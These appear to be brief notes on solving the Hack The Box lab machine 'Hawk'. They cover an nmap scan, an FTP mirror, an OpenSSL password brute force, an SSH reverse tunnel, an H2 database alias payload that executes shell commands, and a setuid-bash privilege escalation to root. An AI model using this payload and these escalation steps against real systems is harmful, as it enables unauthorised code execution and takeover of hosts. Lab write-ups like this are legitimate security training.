#  Hawk

# keyword

burp-openssl-salt

# information

```bash
# Nmap 7.70 scan initiated Mon Apr  1 09:22:13 2019 as: nmap -sC -sV -oA nmap 10.10.10.102

Nmap scan report for 10.10.10.102
Host is up (0.30s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
8082/tcp open  http    H2 database http console
|_http-title: H2 Console
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Apr  1 09:22:49 2019 -- 1 IP address (1 host up) scanned in 35.58 seconds
```

#    wget download ftp

 wget -m -r ftp://10.10.10.102

#  decryp drupal enc withe bruteforce-salted-openssl

```bash

bruteforce-salted-openssl
https://github.com/glv2/bruteforce-salted-openssl

  -d <digest>  Digest for key and initialization vector generation.
                 default: md5

google openssl default digest

### ssl certificate - openssl - What is the public key default MD ...

https://serverfault.com/questions/744076/openssl-what-is-the-public-key-default-md

Dec 18, 2015 - Any *digest* supported by the *OpenSSL* dgst command can be used. ... The *default digest* was changed from MD5 to SHA256 in *Openssl* 1.1.
```

```bash
root@ens:~/htb/Hawk# bruteforce-salted-openssl -1 -c aes-256-cbc -f /usr/share/wordlists/rockyou.txt  -d sha256  drupal.enc
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 30
Tried passwords per second: inf
Last tried password: friends

Password candidate: friends
```



# reverse for h2

ssh -f -N -R 8082:127.0.0.1:8082 test@10.10.14.27

# execute in h2



https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('chmod  4755 /tmp/bash')
```

daniel@hawk:~$ cat user.txt
d5111d4f75370ebd01cdba5b32e202a8
daniel@hawk:~$ cd /tmp/
daniel@hawk:/tmp$ ls
bash             systemd-private-7360dc54f94a443a987c70d6fcfdee9e-apache2.service-kS6oMl
hsperfdata_root  systemd-private-7360dc54f94a443a987c70d6fcfdee9e-systemd-resolved.service-Oro7Yk
LinEnum.sh       systemd-private-7360dc54f94a443a987c70d6fcfdee9e-systemd-timesyncd.service-o03nBy
daniel@hawk:/tmp$ ./bash -p
bash-4.4# cd /root
bash-4.4# cat root.txt
54f3e840fe5564b42a8320fd2b608ba0